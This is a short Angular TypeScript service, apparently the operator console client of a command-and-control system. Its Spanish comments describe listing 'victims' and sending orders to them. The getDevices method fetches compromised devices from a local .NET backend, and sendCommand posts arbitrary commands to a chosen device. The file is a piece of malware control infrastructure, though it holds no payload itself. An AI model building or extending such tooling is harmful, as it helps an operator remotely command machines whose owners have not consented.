import { Injectable } from '@angular/core';
import { HttpClient } from '@angular/common/http';
import { Observable } from 'rxjs';
import { Device } from '../models/device.model';

@Injectable({
  providedIn: 'root'
})
export class C2Service {
  // ⚠️ ASEGÚRATE QUE ESTE PUERTO SEA EL MISMO DE TU SWAGGER (.NET)
  private apiUrl = 'https://localhost:7112/api'; 

  constructor(private http: HttpClient) { }

  // Obtener lista de víctimas
  getDevices(): Observable<Device[]> {
    return this.http.get<Device[]>(`${this.apiUrl}/Admin/devices`);
  }

  // Enviar orden al Backend
  sendCommand(deviceId: string, command: string): Observable<any> {
    return this.http.post(`${this.apiUrl}/Admin/send-command`, {
      deviceId: deviceId,
      command: command
    });
  }
}